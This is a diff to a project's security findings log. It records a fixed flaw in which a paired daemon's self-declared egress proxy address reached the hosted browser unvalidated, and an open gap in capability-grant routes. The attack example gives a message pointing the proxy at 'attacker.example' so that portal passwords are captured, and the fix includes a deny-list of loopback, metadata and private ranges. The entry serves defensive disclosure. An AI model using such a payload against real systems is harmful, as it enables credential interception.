@@ -4801,3 +4801,59 @@ the fifth is recorded OPEN because the complete fix belongs in a file this slice
   A per-run key would have made this window fatal instead (the tombstone would refuse the resumed
   pass), which is one of the two reasons the key is per-pass. NOT closed: closing it properly means
   a fencing token on the wire, and there is no observed failure to justify one.
+
+- **`a-daemons-self-asserted-egress-endpoint-becomes-the-hosted-browsers-proxy-unvalidated`**
+  (FIXED 2026-08-19, HIGH, security - NEW on this branch, because this branch gave `proxyOptionFor`
+  its first production caller). `hello.egressEndpoint` is typed on the wire as a free
+  `z.string().max(255).optional()` (`shared/src/ekoa-local.ts`). `bridge/server.ts` forwarded it
+  verbatim to `registerPairing`, which stored it verbatim; `egressCandidatesForOrg` intersected the
+  CAPABILITIES with the org's grants - honouring I-3, "what a machine ADVERTISES is a self-assertion;
+  what the org GRANTED is the authorisation" - and passed the ADDRESS through untouched. `resolveEgress`
+  returned it as `proxyUrl`, `proxyOptionFor` turned it into `{server}`, and the provider called
+  `browser.newContext({proxy})`.
+  ATTACK. A machine in org A sends hello `{capabilities:['egress.residential'],
+  egressEndpoint:'http://attacker.example:8080'}`. The admin grants `egress.residential` to that
+  pairing - authorising the MACHINE, not a URL; the grant record carried no endpoint, and
+  `advertisedCapabilitiesForOrg` returned capability NAMES, so the address was never shown to the
+  person authorising it. The org's hosted Chromium then launches through the attacker's proxy, and if
+  the step is credential-gated the typist submits the portal password through it. A compromised daemon
+  could change the destination on any reconnect with NO new grant. No scheme, host, or private-range
+  validation existed anywhere on the path.
+  FIX, in two halves because neither is sufficient alone. (1) SHAPE: `api/src/bridge/egress-endpoint.ts`
+  `normaliseEgressEndpoint` - scheme allowlist {http,https,socks5}, Playwright's short form normalised,
+  no embedded credentials, no path/query/fragment, and a refusal of loopback (every spelling, including
+  `[::ffff:127.0.0.1]`), the unspecified address, link-local (169.254/16 and fe80::/10 - the cloud
+  metadata service, refused even under the dev switch), multicast/broadcast and RFC1918; the TAILNET
+  ranges 100.64.0.0/10 and fd7a:115c:a1e0::/48 are ALLOWED BY NAME, because 100.64/10 is RFC 6598
+  shared address space and a naive "reject private" rule would throw away every legitimate value.
+  Applied at ingress (`bridge/server.ts`) and at both the write and the read in `bridge/registry.ts`.
+  (2) AUTHORISATION: `CapabilityGrantDoc.egressEndpoint` - an `egress.residential` grant now NAMES the
+  address it authorises (`grantCapability` throws `CapabilityGrantError` without a usable one), and
+  `egressCandidatesForOrg` withholds both the capability and the address unless the grant's endpoint
+  canonically equals what the machine currently advertises. `advertisedCapabilitiesForOrg` carries the
+  advertised address so a grant surface can show what is being authorised.
+  ALSO FIXED in passing: a hello with NO endpoint used to KEEP the previous one, so a machine could
+  never un-offer a route it once offered. `registerPairing`'s `egressEndpoint` is now a tri-state -
+  `undefined` keeps (the connect path, which is not an advertisement), `null` or an invalid address
+  clears.
+  REACHABILITY, honestly. `config.localBrowserEnabled` is false in production by default, so the
+  hosted launch this protects is a non-prod path until an operator opens the switch; and there is no
+  admin ROUTE that grants a capability at all today (`grantCapability` has no production caller), so
+  no live org currently holds a grant of any kind. Both narrow the blast radius; neither is a reason
+  to leave the path unguarded, and the grant surface that has not been written yet now cannot be
+  written without naming the address it authorises.
+  Pinned by `api/tests/security/egress-endpoint-authorisation.test.ts` (16 assertions across the
+  shape table, the attack, the changed-endpoint reconnect and the registry's storage rules) plus the
+  three ingress cases added to `api/tests/bridge/hello-advertisement.test.ts`. Both halves were
+  verified by mutating the source: dropping the grant-endpoint comparison reddens the attack and the
+  reconnect cases; gutting the host policy reddens six.
+
+- **`no-admin-route-grants-a-bridge-capability-at-all`** (OPEN 2026-08-19, MEDIUM, gap - recorded
+  while fixing the finding above). `grantCapability` / `revokeCapability` / `grantedCapabilities`
+  (`api/src/bridge/capability-grants.ts`) have NO caller outside tests: `routes/bridge.ts` mounts the
+  token mint, the revoke kill switch and presence, and nothing else. So I-3's "the org GRANTED it" is
+  today an authorisation nobody can actually give, which is why default-deny currently reads as
+  "residential egress is unreachable in production" rather than "residential egress is authorised
+  carefully". The endpoint binding above is deliberately built so that the surface, when written,
+  must name the address; the surface itself is out of this branch's scope and belongs with the fleet
+  page that would show `advertisedCapabilitiesForOrg`.
